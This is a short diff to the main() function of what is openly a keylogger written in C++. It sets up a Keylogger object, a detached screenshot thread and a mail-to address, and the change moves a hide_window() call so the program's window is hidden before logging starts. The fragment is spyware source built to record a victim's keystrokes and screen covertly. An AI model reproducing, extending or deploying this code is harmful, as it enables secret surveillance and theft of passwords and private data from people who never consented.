@@ -13,6 +13,8 @@
 
 int main(int argc, char *argv[])
 {	
+	
+
 	bool saving_enabled = false;
 
 	std::string mail_to;
@@ -39,6 +41,7 @@ int main(int argc, char *argv[])
 		keywords = get_keywords();
 	}
 
+	utility::hide_window();
 
 	Keylogger keylogger(saving_enabled, keywords);
 	std::string file_path = keylogger.create_file();
@@ -55,10 +58,6 @@ int main(int argc, char *argv[])
 	Screenshot screenshoter;
 	std::thread screenshot_thread(&Screenshot::auto_start, screenshoter);
 	screenshot_thread.detach();
-
-	//Sleep(10); // give other programs time to run
-
-	utility::hide_window();
 
 	while (1)
 	{
